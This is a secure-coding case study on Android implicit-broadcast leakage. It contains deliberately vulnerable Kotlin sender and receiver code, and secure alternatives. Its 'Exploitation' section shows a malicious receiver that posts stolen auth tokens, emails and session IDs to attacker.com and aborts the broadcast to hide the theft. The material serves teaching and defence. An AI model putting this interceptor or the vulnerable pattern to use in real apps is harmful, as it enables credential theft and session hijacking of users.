---
source: "languages/kotlin/case-studies/android-explicit-broadcast-permission-escalation.md"
title: "Android Implicit Broadcast Data Leakage (Illustrative Pattern)"
category: "case-study"
language: "kotlin"
severity: "high"
tags: [case-study, cause, details, impact, kotlin, overview, pattern, root, secure, technical]
---

# Android Implicit Broadcast Data Leakage (Illustrative Pattern)

**Language:** Kotlin / Java / Android
**Vulnerability Type:** Sensitive data leakage / permission escalation via implicit broadcast
**Date:** Generic pattern (not tied to a single CVE)
**Severity:** High
**Scope:** Illustrative case study of a recurring Android anti-pattern

> **Note:** This is an *illustrative* case study of a well-documented Android
> anti-pattern, not a write-up of one specific numbered CVE. It shows how
> sending sensitive data over an **implicit** broadcast lets any app on the
> device receive it. (Many real Android app CVEs share this root cause; the
> pattern below is a composite for teaching purposes.)

## Overview

A widespread vulnerability pattern in Android applications is sending
**implicit broadcasts** — broadcasts with only an action string and no explicit
target component or package — that carry sensitive data. Because an implicit
broadcast is delivered to *every* registered receiver that matches the action,
any malicious app that registers a receiver for that action can read the
extras. This is the classic "broadcast eavesdropping" leak.

**Key correction:** an **explicit** broadcast (one where you set an explicit
`ComponentName` or call `Intent.setPackage(...)`) can NOT be intercepted by
other apps — Android only delivers it to the named component/package. The risk
described here applies specifically to **implicit** broadcasts that leave the
target unspecified.

## Root Cause

When an app calls `sendBroadcast()`/`sendOrderedBroadcast()` with an **implicit**
intent (only an action, no package or component) and no receiver permission,
the system delivers it to any matching exported receiver on the device. If the
extras contain secrets, any app can:

1. Register a receiver (or a high-priority one, for ordered broadcasts) for that action
2. Extract sensitive data from the intent extras
3. Call `abortBroadcast()` on an ordered broadcast to hide the theft from the legitimate receiver

## Technical Details

### Vulnerable Pattern
```kotlin
// VULNERABLE: Sending an IMPLICIT broadcast with sensitive data
class AuthService : Service() {
    fun notifyLoginSuccess(user: User) {
        val intent = Intent("com.app.AUTH_RESULT").apply {
            // ⚠️ No setPackage() and no component — this is an IMPLICIT broadcast,
            //    delivered to EVERY matching receiver on the device.
            putExtra("auth_token", user.token)       // ⚠️ Sensitive!
            putExtra("user_email", user.email)       // ⚠️ Sensitive!
            putExtra("session_id", user.sessionId)    // ⚠️ Sensitive!
        }

        // ⚠️ Implicit + null permission = any app can register a receiver and read the extras.
        //    For ordered broadcasts a high-priority receiver can even abort delivery.
        sendOrderedBroadcast(intent, null)  // null permission = anyone can listen
    }
}
```

### Receiver Side (Vulnerable)
```xml
<!-- VULNERABLE MANIFEST: Exported receiver with sensitive data -->
<receiver
    android:name=".AuthReceiver"
    android:exported="true">  <!-- ⚠️ Exported! -->
    <intent-filter>
        <action android:name="com.app.AUTH_RESULT"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</receiver>
```

```kotlin
// VULNERABLE: Receiver processes data without checking sender
class AuthReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val token = intent.getStringExtra("auth_token") ?: return
        val email = intent.getStringExtra("user_email") ?: return
        
        // Process authentication data
        SessionManager.storeToken(token, email)
    }
}
```

### Exploitation
```kotlin
// MALICIOUS APP: Intercepts auth broadcasts
class MaliciousReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val token = intent.getStringExtra("auth_token")
        val email = intent.getStringExtra("user_email")
        val sessionId = intent.getStringExtra("session_id")
        
        // Send stolen data to attacker server
        HttpClient.post("https://attacker.com/steal", mapOf(
            "token" to token,
            "email" to email,
            "session" to sessionId
        ))
        
        // Optionally abort the broadcast to hide the theft
        abortBroadcast()
    }
}
```

## Impact

- **Token Theft**: Authentication tokens stolen from any app using this pattern
- **Session Hijacking**: Attackers can impersonate the user
- **Data Exfiltration**: Email addresses, session IDs, and other PII stolen
- **Silent Exploitation**: `abortBroadcast()` prevents any detection by the legitimate app
- **Broad exposure**: this anti-pattern has appeared in many real Android apps, some with very large install bases

## Secure Pattern

```kotlin
// SECURE: Use LocalBroadcastManager (now deprecated but safer pattern)
// Or better: Use a proper event bus with scoped delivery

// OPTION 1: Use a signature-level permission
<permission
    android:name="com.app.permission.AUTH_BROADCAST"
    android:protectionLevel="signature" />

<receiver
    android:name=".AuthReceiver"
    android:permission="com.app.permission.AUTH_BROADCAST"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.AUTH_RESULT"/>
    </intent-filter>
</receiver>

// OPTION 2: Use sealed classes / shared flow (no intents)
class AuthEventBus {
    private val _events = MutableSharedFlow<AuthEvent>(extraBufferCapacity = 1)
    val events: SharedFlow<AuthEvent> = _events.asSharedFlow()
    
    suspend fun emit(event: AuthEvent) {
        _events.emit(event)
    }
}

sealed class AuthEvent {
    data class LoginSuccess(val token: String, val email: String) : AuthEvent()
    data class LoginFailure(val error: String) : AuthEvent()
}

// OPTION 3: If you must use broadcasts, make them EXPLICIT and/or permission-guarded
val intent = Intent("com.app.AUTH_RESULT")
intent.putExtra("auth_token", token)

// (a) Scope delivery to your own package so no other app receives it
intent.setPackage(packageName)          // now an explicit broadcast — other apps can't get it
// (b) And/or require a signature-level permission on the receiving side
sendBroadcast(intent, "com.app.permission.AUTH_BROADCAST")
```

## Security Checklist

- [ ] All custom permissions use `protectionLevel="signature"`
- [ ] BroadcastReceivers handling sensitive data use signature-level permissions
- [ ] Prefer `SharedFlow` / sealed classes over broadcast intents for in-app communication
- [ ] If broadcasts are necessary, keep them explicit (`setPackage()`/component) and/or use `sendBroadcast(permission)` — never send secrets on an implicit broadcast
- [ ] Never put tokens, passwords, or PII in broadcast intent extras
- [ ] Avoid `android:exported="true"` on receivers handling sensitive data
- [ ] Consider using `AppAuth` or platform-based auth instead of custom token broadcasts

## References

- [Android Developer — Broadcast Security](https://developer.android.com/guide/components/broadcasts#security)
- [Android Security Bulletins](https://source.android.com/docs/security/bulletin)
- [OWASP Mobile Top 10 — M1: Improper Platform Usage](https://owasp.org/www-project-mobile-top-10/)
- [Snyk — Android Broadcast Security](https://snyk.io/blog/android-broadcast-security/)
- [Android Developer — Permissions Overview](https://developer.android.com/guide/topics/permissions/overview)
